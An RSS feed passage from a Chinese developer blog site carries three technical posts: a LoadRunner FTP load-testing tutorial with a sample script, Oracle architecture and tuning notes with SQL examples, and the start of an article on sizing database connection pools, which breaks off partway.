<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>loadrunner ftp协议使用详细步骤 - S-Gavin</title>
<link>http://www.cnblogs.com/zwh-Seeking/p/10832000.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zwh-Seeking/p/10832000.html</guid>
<description>&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;loadrunner ftp&lt;/strong&gt;&lt;strong&gt;协议使用详细步骤&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;大家好，我会给大家讲解两种编写方式，手动和录制。^_^&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;strong&gt;1、首先要了解loadrunner中几个FTP函数&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;在loadrunner联机帮助文档的索引中，输入FTP，此时你会看到不下50个与ftp有关的函数，想了一下为了解决使用FTP文件上传这个问题，只需要一下几个步骤就可以了：&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;注意：&lt;/strong&gt;每个FTP函数都是以ftp前缀开头的。多数的ftp函数都会成对出现（一个事用于全局的会话，一个事用户指定邮件回话）。它们之间的差别是，全局的没有_ex后缀，特定会话的有_ex后缀。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;第一、  与ftp服务器建立连接&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;第二、   传输文件&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;第三、   关闭连接&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;所以我现在只需要关注与这三个步骤有关的函数就可以了。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;经过挑选终于找到了一下几个函数：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;6&quot;&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;函数&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;描述&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_logon[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;登录到FTP服务器&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_logout[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;注销FTP服务器&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_dir[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;在FTP上执行dir命令&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_get[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;从FTP上获取文件&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_get_last_error&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;检索从FTP服务器接收到的最后一个错误&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_get_last_error_id&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;检索从FTP服务器接受到的最后一个错误的ID&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_mkdir[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;在ftp服务器上创建目录&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_put[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;将文件放到FTP服务器上&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_rendir[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;重命名FTP服务器上的目录&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;3&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_rmdir[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot; readability=&quot;5&quot;&gt;
&lt;p align=&quot;left&quot;&gt;删除FTP服务器计算机上的目录&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;ftp_delete[_ex]&lt;/p&gt;
&lt;/td&gt;
&lt;td valign=&quot;top&quot; width=&quot;284&quot;&gt;
&lt;p align=&quot;left&quot;&gt;从FTP上删除文件&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p align=&quot;left&quot;&gt;第一、   与ftp服务器建立连接的函数&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;       &lt;strong&gt;ftp_logon_ex (&lt;/strong&gt;FTP *ppftp, char *transaction, char *url, LAST&lt;strong&gt;);&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;      &lt;/strong&gt; 这个函数主要的功能是建立与ftp服务器的连接，其中的参数含义如下：&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;       Transaction：为这个连接起一个名字，在这里随便起&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　url：ftp://username:password@mailserver:port，指定连接用户名、密码、服务器地址、端口&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;第二、   传输文件的函数&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;       &lt;strong&gt;ftp_put_ex (&lt;/strong&gt;FTP *ppftp, char *transaction, char *item_list, LAST&lt;strong&gt;);&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;      &lt;/strong&gt; 这个函数主要的功能是指定把本地的某个文件上传到服务器的某个目录下&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;      &lt;/strong&gt; transaction：为这个操作起一个名字，在这里随便起&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;       item_list：其中包括&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　SOURCE_PATH,指定本地上传文件的路径&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　TARGET_PATH制定要上传到服务器的路径&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　ENDITEM - Marks the end of the list.（不好翻译呵呵）&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;第三、   关闭连接的函数&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;       &lt;strong&gt;ftp_logout_ex (&lt;/strong&gt;FTP *ppftp&lt;strong&gt;);&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;      &lt;/strong&gt; 这个函数的主要功能是断开FTP链接&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;1.1、  模拟文件上传过程（手动编写）&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;知道了上面的函数我们把代码写一下：&lt;/p&gt;
&lt;p&gt;Action()&lt;br/&gt;{&lt;br/&gt;    unsigned long *ftp_session=NULL;&lt;br/&gt;    double duration,lSize,lDur;&lt;br/&gt;    ftp_logon_ex(&amp;amp;ftp_session,&quot;ftp_logon&quot;,&quot;URL=ftp://ftpuser:ftpuser@192.168.0.1:21&quot;,LAST);&lt;br/&gt;    ftp_put_ex(&amp;amp;ftp_session, &quot;Ftp_Put&quot;,&lt;br/&gt;            &quot;SOURCE_PATH=d:/test.txt&quot;,&lt;br/&gt;           &quot;TARGET_PATH=/ftptest/test.txt&quot;,&lt;br/&gt;     　　ENDITEM,&lt;br/&gt;    　　 LAST);   &lt;br/&gt; // 取得下载持续时间&lt;br/&gt;    duration= ftp_get_last_transfer_duration_ex(&amp;amp;ftp_session);&lt;br/&gt;    // 输出下载持续时间&lt;br/&gt;    lr_output_message(&quot;Get_Small_File Transfer took %.3f milliseconds&quot;, duration);&lt;br/&gt;    //Action.c(35): Get_Small_File Transfer took 10.000 milliseconds   &lt;br/&gt;    // 取得下载的详细信息&lt;br/&gt;    ftp_get_last_download_details_ex(&amp;amp;ftp_session, &amp;amp;lSize, &amp;amp;lDur);&lt;br/&gt;    // 输出下载的详细信息&lt;br/&gt;    lr_output_message(&quot;Get_Small_File Download of %d bytes took %d milliseconds&quot;, lSize, lDur);&lt;br/&gt;    //Action.c(39): Get_Small_File Download of 4307 bytes took 180 milliseconds&lt;br/&gt;//释放FTP连接&lt;br/&gt;   ftp_logout_ex(&amp;amp;ftp_session);&lt;br/&gt; return 0;&lt;br/&gt;}&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;运行一次，发现d:\test.txt文件已经成功上传到FTP服务器&lt;strong&gt;/ftptest/&lt;/strong&gt;目录下，OK大功告成！&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;注意：若上传文件到&lt;strong&gt;linux&lt;/strong&gt;服务器上，“TARGET_PATH”目标路径为&lt;strong&gt;全路径&lt;/strong&gt;。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;好了，基本的结构写出来了，执行脚本，发现可以把指定的文件上传到制定的目录下了，接下来就根据自己实际需要强化脚本就可以了，参数化上传文件、加入事务、集合点，监测上传文件的时间和服务器的性能，强化脚本在这里就不多说了。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;在这个过程中遇到的&lt;strong&gt;问题&lt;/strong&gt;：&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;1）在声明ftp连接句柄时，我看网上的一些资料中介绍声明称FTP ftp1 = 0 ；但是这样写会出现语法错误，当我把它修改成unsigned long *ftp_session=NULL;后就没有问题了，其中原因不明。&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;strong&gt;1.2 录制FTP上传文件&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;1)同http协议类似，地址例如：&lt;a href=&quot;ftp://188.177.155.197:21&quot;&gt;ftp://1172.31.27.2:21&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;2) 单击Option、点击Tools-&amp;gt;Recording Options或者在工具栏点击图标，打开“Recording Options”对话框，便可开始设置录制选项。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/848039/201905/848039-20190508152541884-808949237.png&quot; alt=&quot;&quot; width=&quot;569&quot; height=&quot;360&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3)对于FTP协议脚本的录制，如果不对端口映射进行限制，很容易造成录制的脚本为空。因此，在进行脚本录制之前，我们要进行FTP协议的端口映射。将Network-level server address mappings for设置为FTP，单击“New Entry”，在弹出的“Server Wntry”对话框中将Target Server设置为“172.31.27.2”（FTP服务器的IP地址），Service ID设置为FTP，端口Port设置为Any（因为FTP协议涉及多个端口）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/848039/201905/848039-20190508152556931-606130914.png&quot; alt=&quot;&quot; width=&quot;465&quot; height=&quot;511&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4)登录172.31.27.2这个FTP服务器，执行上传文件的操作，然后退出，完成脚本的录制。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/848039/201905/848039-20190508152711942-117867541.png&quot; alt=&quot;&quot; width=&quot;577&quot; height=&quot;444&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4）回放PASS，根据需求，增加脚本，完成。&lt;/p&gt;

&lt;p&gt;ENDing...&lt;/p&gt;
</description>
<pubDate>Wed, 08 May 2019 07:30:00 +0000</pubDate>
<dc:creator>S-Gavin</dc:creator>
<og:description>loadrunner ftp协议使用详细步骤 大家好，我会给大家讲解两种编写方式，手动和录制。^_^ 1、首先要了解loadrunner中几个FTP函数 在loadrunner联机帮助文档的索引中，输</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zwh-Seeking/p/10832000.html</dc:identifier>
</item>
<item>
<title>Oracle体系结构学习笔记 - smileNicky</title>
<link>http://www.cnblogs.com/mzq123/p/10832131.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mzq123/p/10832131.html</guid>
<description>&lt;p&gt;Oracle体系结构由实例和一组数据文件组成，实例由SGA内存区，SGA意思是共享内存区，由share pool(共享池)、data buffer(数据缓冲区)、log buffer(日志缓冲区)组成&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190505154710576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9zbWlsZW5pY2t5LmJsb2cuY3Nkbi5uZXQ=,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;SGA内存区的share pool是解析SQL并保存执行计划的，然后SQL根据执行计划获取数据时先看data buffer里是否有数据，没数据才从磁盘读，然后还是读到data buffer里，下次就直接读data buffer的，当SQL更新时，data buffer的数据就必须写入磁盘备份，为了保护这些数据，才有log buffer，这就是大概的原理简介&lt;br/&gt;系统结构关系图如图，图来自《收获，不止SQL优化》一书：&lt;img src=&quot;https://img-blog.csdnimg.cn/20190505150232586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9zbWlsZW5pY2t5LmJsb2cuY3Nkbi5uZXQ=,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面介绍共享池、数据缓冲、日志缓冲方面调优的例子&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;共享池相关例子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;未使用使用绑定变量的情况，进行一下批量写数据，在登录系统，经常用的sql是&lt;code&gt;select * from sys_users where username='admin'&lt;/code&gt;或者什么什么的，假如有很多用户登录，就需要执行很多次这样类似的sql，能不能用一条SQL代表？意思是不需要Oracle优化器每次都解析sql获取执行计划，对于这种类似的sql是没必要的，Oracle提供了绑定变量的方法，可以用于调优sql，然后一堆sql就可以用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select * from sys_users where username=:x
 &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里用一个变量x表示，具体例子如下，&lt;/p&gt;
&lt;p&gt;新建一张表来测试&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;create table t (x int);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;不使用绑定遍历，批量写数据&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;begin 
    for i in 1 .. 1000
    loop
        execute immediate
        'insert into t values('|| i ||')';
        commit;
    end loop;
end;
/&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;已用时间: 00: 00: 00.80&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;加上绑定遍历，绑定变量是用:x的形式&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;begin 
    for i in 1 .. 100
    loop
        execute immediate
        'insert into t values( :x )' using i;
    commit;
    end loop;
end;
/&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;已用时间: 00: 00: 00.05&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;数据缓冲相关例子&lt;/strong&gt;&lt;br/&gt;这里介绍和数据缓存相关例子&lt;/p&gt;
&lt;p&gt;(1) 清解析缓存&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//创建一个表来测试
SQL&amp;gt; create table t as select * from dba_objects;
表已创建。
//设置打印行数
SQL&amp;gt; set linesize 1000
//设置执行计划开启
SQL&amp;gt; set autotrace on
//打印出时间
SQL&amp;gt; set timing on
//查询一下数据
SQL&amp;gt; select count(1) from t;

  COUNT(1)
----------
     72043

已用时间:  00: 00: 00.10

//清一下缓冲区缓存(ps:这个sql不能随便在生产环境执行)
SQL&amp;gt; alter system flush buffer_cache;
系统已更改。
已用时间:  00: 00: 00.08

//清一下共享池缓存(ps:这个sql不能随便在生产环境执行)
SQL&amp;gt; alter system flush shared_pool;

//再次查询，发现查询快了
SQL&amp;gt; select count(1) from t;

  COUNT(1)
----------
     72043

已用时间:  00: 00: 00.12

SQL&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;日志缓冲相关例子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里说明一下，日志关闭是可以提供性能的，不过在生生产环境还是不能随便用，只能说是一些特定创建，SQL如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;alter table [表名] nologging;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;调优拓展知识&lt;/strong&gt;&lt;br/&gt;这些是看《收获，不止SQL优化》一书的小记&lt;/p&gt;
&lt;p&gt;(1) 批量写数据事务问题&lt;br/&gt;对于循环批量事务提交的问题，commit放在循环内和放在循环外的区别，&lt;/p&gt;
&lt;p&gt;放在循环内，每次执行就提交一次事务，这种时间相对比较少的&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;begin 
    for i in 1 .. 1000
    loop
        execute immediate
        'insert into t values('|| i ||')';
        commit;
    end loop;
end;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;放在循环外，sql循环成功，再提交一次事务，这种时间相对比较多一点&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;begin 
    for i in 1 .. 1000
    loop
        execute immediate
        'insert into t values('|| i ||')';
    end loop;
    commit;
end;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;《收获，不止SQL优化》一书提供的脚本，用于查看逻辑读、解析、事务数等等情况：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;select s.snap_date,
       decode(s.redosize, null, '--shutdown or end--', s.currtime) &quot;TIME&quot;,
       to_char(round(s.seconds / 60, 2)) &quot;elapse(min)&quot;,
       round(t.db_time / 1000000 / 60, 2) &quot;DB time(min)&quot;,
       s.redosize redo,
       round(s.redosize / s.seconds, 2) &quot;redo/s&quot;,
       s.logicalreads logical,
       round(s.logicalreads / s.seconds, 2) &quot;logical/s&quot;,
       physicalreads physical,
       round(s.physicalreads / s.seconds, 2) &quot;phy/s&quot;,
       s.executes execs,
       round(s.executes / s.seconds, 2) &quot;execs/s&quot;,
       s.parse,
       round(s.parse / s.seconds, 2) &quot;parse/s&quot;,
       s.hardparse,
       round(s.hardparse / s.seconds, 2) &quot;hardparse/s&quot;,
       s.transactions trans,
       round(s.transactions / s.seconds, 2) &quot;trans/s&quot;
  from (select curr_redo - last_redo redosize,
               curr_logicalreads - last_logicalreads logicalreads,
               curr_physicalreads - last_physicalreads physicalreads,
               curr_executes - last_executes executes,
               curr_parse - last_parse parse,
               curr_hardparse - last_hardparse hardparse,
               curr_transactions - last_transactions transactions,
               round(((currtime + 0) - (lasttime + 0)) * 3600 * 24, 0) seconds,
               to_char(currtime, 'yy/mm/dd') snap_date,
               to_char(currtime, 'hh24:mi') currtime,
               currsnap_id endsnap_id,
               to_char(startup_time, 'yyyy-mm-dd hh24:mi:ss') startup_time
          from (select a.redo last_redo,
                       a.logicalreads last_logicalreads,
                       a.physicalreads last_physicalreads,
                       a.executes last_executes,
                       a.parse last_parse,
                       a.hardparse last_hardparse,
                       a.transactions last_transactions,
                       lead(a.redo, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_redo,
                       lead(a.logicalreads, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_logicalreads,
                       lead(a.physicalreads, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_physicalreads,
                       lead(a.executes, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_executes,
                       lead(a.parse, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_parse,
                       lead(a.hardparse, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_hardparse,
                       lead(a.transactions, 1, null) over(partition by b.startup_time order by b.end_interval_time) curr_transactions,
                       b.end_interval_time lasttime,
                       lead(b.end_interval_time, 1, null) over(partition by b.startup_time order by b.end_interval_time) currtime,
                       lead(b.snap_id, 1, null) over(partition by b.startup_time order by b.end_interval_time) currsnap_id,
                       b.startup_time
                  from (select snap_id,
                               dbid,
                               instance_number,
                               sum(decode(stat_name, 'redo size', value, 0)) redo,
                               sum(decode(stat_name,
                                          'session logical reads',
                                          value,
                                          0)) logicalreads,
                               sum(decode(stat_name,
                                          'physical reads',
                                          value,
                                          0)) physicalreads,
                               sum(decode(stat_name, 'execute count', value, 0)) executes,
                               sum(decode(stat_name,
                                          'parse count (total)',
                                          value,
                                          0)) parse,
                               sum(decode(stat_name,
                                          'parse count (hard)',
                                          value,
                                          0)) hardparse,
                               sum(decode(stat_name,
                                          'user rollbacks',
                                          value,
                                          'user commits',
                                          value,
                                          0)) transactions
                          from dba_hist_sysstat
                         where stat_name in
                               ('redo size',
                                'session logical reads',
                                'physical reads',
                                'execute count',
                                'user rollbacks',
                                'user commits',
                                'parse count (hard)',
                                'parse count (total)')
                         group by snap_id, dbid, instance_number) a,
                       dba_hist_snapshot b
                 where a.snap_id = b.snap_id
                   and a.dbid = b.dbid
                   and a.instance_number = b.instance_number
                 order by end_interval_time)) s,
       (select lead(a.value, 1, null) over(partition by b.startup_time order by b.end_interval_time) - a.value db_time,
               lead(b.snap_id, 1, null) over(partition by b.startup_time order by b.end_interval_time) endsnap_id
          from dba_hist_sys_time_model a, dba_hist_snapshot b
         where a.snap_id = b.snap_id
           and a.dbid = b.dbid
           and a.instance_number = b.instance_number
           and a.stat_name = 'DB time') t
 where s.endsnap_id = t.endsnap_id
 order by s.snap_date, time desc;
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Wed, 08 May 2019 07:29:00 +0000</pubDate>
<dc:creator>smileNicky</dc:creator>
<og:description>Oracle体系结构由实例和一组数据文件组成，实例由SGA内存区，SGA意思是共享内存区，由share pool(共享池)、data buffer(数据缓冲区)、log buffer(日志缓冲区)组成</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/mzq123/p/10832131.html</dc:identifier>
</item>
<item>
<title>如何正确设置数据库连接池的大小？我的天，原来之前都设置错了！ - 犬小哈</title>
<link>http://www.cnblogs.com/quanxiaoha/p/10832014.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/quanxiaoha/p/10832014.html</guid>
<description>&lt;blockquote readability=&quot;6.3583815028902&quot;&gt;
&lt;p&gt;文章翻译整理自: &lt;a href=&quot;https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing&quot; class=&quot;uri&quot;&gt;https://github.com/brettwooldridge/HikariCP/wiki/About-Pool-Sizing&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;欢迎关注个人微信公众号: &lt;strong&gt;小哈学Java&lt;/strong&gt;, 文末&lt;strong&gt;分享阿里 P8 资深架构师吐血总结的 《Java 核心知识整理&amp;amp;面试.pdf》资源链接&lt;/strong&gt;！！&lt;/p&gt;
&lt;p&gt;个人网站: &lt;a href=&quot;https://www.exception.site/essay/how-to-set-the-size-of-database-connection-pool&quot; class=&quot;uri&quot;&gt;https://www.exception.site/essay/how-to-set-the-size-of-database-connection-pool&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155723409259039&quot; title=&quot;如何正确设置数据库连接池大小&quot; alt=&quot;如何正确设置数据库连接池大小&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;目录&quot;&gt;目录&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;一、笔者前言&lt;/li&gt;
&lt;li&gt;二、正菜开始&lt;/li&gt;
&lt;li&gt;三、假设你的服务有1万并发的访问&lt;/li&gt;
&lt;li&gt;四、为啥有这种效果?&lt;/li&gt;
&lt;li&gt;五、其他应该考虑到的因素&lt;/li&gt;
&lt;li&gt;六、连接数计算公式&lt;/li&gt;
&lt;li&gt;七、结论：你需要的是一个小连接池，和一个等待连接的线程队列
&lt;ul&gt;&lt;li&gt;八、额外需要注意的点&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;一笔者前言&quot;&gt;一、笔者前言&lt;/h2&gt;
&lt;p&gt;基本上来说，大部分项目都需要跟数据库做交互，那么，数据库连接池的大小设置成多大合适呢？&lt;/p&gt;
&lt;p&gt;一些开发老鸟可能还会告诉你：&lt;strong&gt;没关系，尽量设置的大些，比如设置成 200，这样数据库性能会高些，吞吐量也会大些！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;你也许会点头称是，真的是这样吗？看完这篇文章，也许会颠覆你的认知哦！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://exception-image-bucket.oss-cn-hangzhou.aliyuncs.com/155723419807267&quot; title=&quot;你不要骗我&quot; alt=&quot;你不要骗我&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;二正菜开始&quot;&gt;二、正菜开始&lt;/h2&gt;
&lt;p&gt;可以很直接的说，关于数据库连接池大小的设置，每个开发者都可能在一环节掉进坑里，事实上呢，大部分程序员可能都会依靠自己的直觉去设置它的大小，设置成 100 ？思量许久后，自顾自想，应该差不多吧？&lt;/p&gt;
&lt;h2 id=&quot;三假设你的服务有1万并发的访问&quot;&gt;三、假设你的服务有1万并发的访问&lt;/h2&gt;
&lt;p&gt;不妨意淫一下，你手里有个网站，并发压力虽然还没到 Facebook 那个级别，但是呢？也有个1万上下的并发量！也就是说差不多2万左右的 TPS。&lt;/p&gt;
&lt;p&gt;那么问题来了！&lt;strong&gt;这个网站的数据库连接池应该设置成多大合适呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实这个问法本身就是有问题的，我们需要反过来问，正确问法应该是：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;“这个网站的数据库连接池应该设置成多小合适呢？”&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;3.9831932773109&quot;&gt;
